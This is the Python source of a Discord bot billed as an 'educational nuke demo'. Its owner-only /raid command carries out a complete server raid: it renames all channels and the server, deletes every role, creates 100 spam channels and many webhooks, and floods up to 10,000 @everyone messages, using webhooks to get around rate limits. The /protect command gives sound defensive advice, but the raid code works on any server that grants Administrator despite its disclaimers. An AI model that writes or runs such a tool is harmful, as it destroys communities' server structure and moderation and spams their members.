import discord
from discord.ext import commands
import asyncio
import os

# ========== CONFIGURATION ==========
TOKEN = os.getenv("DISCORD_TOKEN")
OWNER_ID = 1088143400496279552

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=".", intents=intents)

active_demo = {}

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"✅ Educational Demo Bot ready - {bot.user}")
    print(f"⚠️ This bot is for EDUCATIONAL PURPOSES only")

@bot.tree.command(name="raid", description="[OWNER ONLY] Realistic educational nuke demonstration")
async def raid(
    interaction: discord.Interaction,
    message: str = "⚠️ THIS SERVER HAS BEEN NUKED ⚠️ | discord.gg/example | CONTACT OWNER IMMEDIATELY",
    ping: str = "yes",
    amount: int = 100
):
    if interaction.user.id != OWNER_ID:
        return await interaction.response.send_message("❌ Only the bot owner can run this.", ephemeral=True)
    
    if not interaction.guild.me.guild_permissions.administrator:
        return await interaction.response.send_message("❌ Bot needs Administrator permission.", ephemeral=True)
    
    # Acknowledge
    await interaction.response.send_message("⚠️ **EDUCATIONAL DEMO STARTING IN 5 SECONDS** - This is what a real nuke looks like", ephemeral=False)
    await asyncio.sleep(5)
    
    ping_enabled = ping.lower() in ['yes', 'y', 'true', '1']
    msg_amount = min(amount, 10000)  # Max 10,000 messages
    
    guild = interaction.guild
    active_demo[guild.id] = True
    
    # Create a log channel to show progress
    log_channel = None
    try:
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=True, send_messages=True),
            guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
        }
        log_channel = await guild.create_text_channel("🔴-NUKED-BY-DEMO", overwrites=overwrites)
        await log_channel.send("💀 **EDUCATIONAL NUKE DEMO IN PROGRESS** 💀")
        await log_channel.send("This is what a malicious nuke bot does to a server.")
        await log_channel.send("Watch closely to understand why you should NEVER give Admin to untrusted bots.")
    except:
        pass
    
    try:
        # ========== PHASE 1: Rename all existing channels ==========
        if log_channel:
            await log_channel.send("📢 **PHASE 1: Renaming all channels...**")
        
        for channel in guild.channels:
            if not active_demo.get(guild.id):
                break
            if channel == log_channel:
                continue
            try:
                await channel.edit(name="nuked-by-demo")
                await asyncio.sleep(0.1)
            except:
                pass
        
        # ========== PHASE 2: Rename the server ==========
        if log_channel:
            await log_channel.send("📢 **PHASE 2: Renaming server...**")
        
        try:
            await guild.edit(name="🔥 NUKED BY DEMO 🔥")
        except:
            pass
        
        # ========== PHASE 3: Delete all roles ==========
        if log_channel:
            await log_channel.send("📢 **PHASE 3: Destroying all roles...**")
        
        for role in guild.roles:
            if not active_demo.get(guild.id):
                break
            if role.is_default() or role.managed or role == guild.me.top_role:
                continue
            try:
                await role.delete()
                await asyncio.sleep(0.1)
            except:
                pass
        
        # ========== PHASE 4: Create 100 spam channels ==========
        if log_channel:
            await log_channel.send("📢 **PHASE 4: Creating 100 spam channels...**")
        
        spam_channels = []
        for i in range(100):
            if not active_demo.get(guild.id):
                break
            try:
                channel = await guild.create_text_channel(f"nuked-by-demo-{i}")
                spam_channels.append(channel)
                await asyncio.sleep(0.2)
            except:
                pass
        
        if log_channel:
            await log_channel.send(f"✅ Created {len(spam_channels)} spam channels")
        
        # ========== PHASE 5: Create webhooks in every channel ==========
        if log_channel:
            await log_channel.send("📢 **PHASE 5: Creating webhooks for spam...**")
        
        webhooks = []
        for channel in spam_channels[:50]:  # Limit to 50 channels to avoid rate limits
            if not active_demo.get(guild.id):
                break
            try:
                for i in range(3):
                    wh = await channel.create_webhook(name=f"spammer_{i}")
                    webhooks.append(wh)
                    await asyncio.sleep(0.2)
            except:
                pass
        
        # ========== PHASE 6: Send spam messages (up to 10,000) ==========
        if log_channel:
            await log_channel.send(f"📢 **PHASE 6: Sending {msg_amount} spam messages with ping={'ON' if ping_enabled else 'OFF'}...**")
        
        ping_text = "@everyone " if ping_enabled else ""
        
        # Send via webhooks (bypasses rate limits better)
        for channel in spam_channels[:30]:  # Focus on first 30 channels
            if not active_demo.get(guild.id):
                break
            
            for i in range(min(msg_amount // 30, 100)):  # Distribute messages
                if not active_demo.get(guild.id):
                    break
                try:
                    # Get or create a webhook for this channel
                    channel_webhooks = [wh for wh in webhooks if wh.channel_id == channel.id]
                    if channel_webhooks:
                        await channel_webhooks[0].send(f"{ping_text}{message} [{i+1}/{msg_amount//30}]")
                    else:
                        await channel.send(f"{ping_text}{message} [{i+1}/{msg_amount//30}]")
                    await asyncio.sleep(0.1)
                except:
                    pass
        
        # Also spam in the log channel
        for i in range(min(msg_amount // 10, 50)):
            if not active_demo.get(guild.id):
                break
            try:
                await log_channel.send(f"{ping_text}💀 {message} 💀")
                await asyncio.sleep(0.1)
            except:
                pass
        
        # ========== PHASE 7: Send final educational summary ==========
        embed = discord.Embed(
            title="💀 EDUCATIONAL NUKE DEMO COMPLETE 💀",
            description=f"**What just happened to this server:**\n\n"
                       f"🔥 **1. Channels Renamed** - All {len(guild.channels)} channels renamed to 'nuked-by-demo'\n"
                       f"📛 **2. Server Renamed** - Server name changed\n"
                       f"👑 **3. Roles Destroyed** - All admin/mod roles deleted\n"
                       f"📁 **4. Spam Channels** - {len(spam_channels)} new channels created\n"
                       f"🕸️ **5. Webhooks Created** - Used to bypass rate limits\n"
                       f"💬 **6. Mass Pinging** - {msg_amount} messages sent with {'@everyone' if ping_enabled else 'no pings'}\n\n"
                       f"**🚨 HOW TO PROTECT YOUR REAL SERVER:**\n"
                       f"• ✅ NEVER give Administrator to untrusted bots\n"
                       f"• ✅ Use 2FA on all admin accounts\n"
                       f"• ✅ Set verification level to HIGH\n"
                       f"• ✅ Use backup bots (Xenon) to save server structure\n"
                       f"• ✅ Regularly audit bot permissions\n"
                       f"• ✅ Create a 'emergency stop' role with channel creation permissions\n\n"
                       f"**⚠️ This was an EDUCATIONAL DEMO. Your real server is NOT affected.**\n"
                       f"**To clean up, delete this test server or restore from backup.**",
            color=discord.Color.red()
        )
        
        if log_channel:
            await log_channel.send(embed=embed)
        
        # Also try to DM the owner
        try:
            owner = await bot.fetch_user(OWNER_ID)
            await owner.send(embed=embed)
        except:
            pass
        
    except Exception as e:
        if log_channel:
            await log_channel.send(f"❌ Demo error: {e}")
    finally:
        active_demo[guild.id] = False

@bot.tree.command(name="stopraid", description="[OWNER ONLY] Emergency stop")
async def stopraid(interaction: discord.Interaction):
    if interaction.user.id != OWNER_ID:
        return await interaction.response.send_message("❌ Only the bot owner can stop the demo.", ephemeral=True)
    
    if interaction.guild.id in active_demo:
        active_demo[interaction.guild.id] = False
        await interaction.response.send_message("🛑 **Educational demo stopped**", ephemeral=False)
    else:
        await interaction.response.send_message("No active demo.", ephemeral=True)

@bot.tree.command(name="protect", description="How to protect your server from nuke bots")
async def protect(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🛡️ How to Protect Your Server",
        description="Educational security guide",
        color=discord.Color.green()
    )
    embed.add_field(name="1. NEVER give Admin to untrusted bots", 
                    value="Review bot permissions before inviting. Most nuke bots request Administrator.", 
                    inline=False)
    embed.add_field(name="2. Enable 2FA", 
                    value="All administrator accounts should have 2FA enabled.", 
                    inline=False)
    embed.add_field(name="3. Server Verification Level", 
                    value="Set to 'High' (member must be registered for 10+ minutes).", 
                    inline=False)
    embed.add_field(name="4. Use Backup Bots", 
                    value="Xenon and similar bots can save/restore your server structure.", 
                    inline=False)
    embed.add_field(name="5. Audit Logs", 
                    value="Regularly check Audit Logs for mass channel creation.", 
                    inline=False)
    embed.add_field(name="6. Create an Emergency Plan", 
                    value="Have a role with 'Manage Channels' to stop raids quickly.", 
                    inline=False)
    embed.set_footer(text="Educational purposes only")
    
    await interaction.response.send_message(embed=embed, ephemeral=False)

@bot.tree.command(name="commands", description="Show all commands")
async def cmd_list(interaction: discord.Interaction):
    embed = discord.Embed(
        title="Educational Nuke Demo Bot",
        description="⚠️ For EDUCATIONAL purposes only - run on TEST servers",
        color=discord.Color.blue()
    )
    embed.add_field(name="/raid [message] [ping] [amount]", 
                    value="Start realistic nuke demonstration\n"
                          "• `message` - Custom spam text\n"
                          "• `ping` - yes/no for @everyone\n"
                          "• `amount` - Messages to send (1-10000)", 
                    inline=False)
    embed.add_field(name="/stopraid", 
                    value="Emergency stop the demo", 
                    inline=False)
    embed.add_field(name="/protect", 
                    value="Show protection guide", 
                    inline=False)
    embed.add_field(name="/commands", 
                    value="Show this help", 
                    inline=False)
    
    await interaction.response.send_message(embed=embed, ephemeral=False)

if __name__ == "__main__":
    if not TOKEN:
        print("ERROR: DISCORD_TOKEN not set")
        exit(1)
    bot.run(TOKEN)
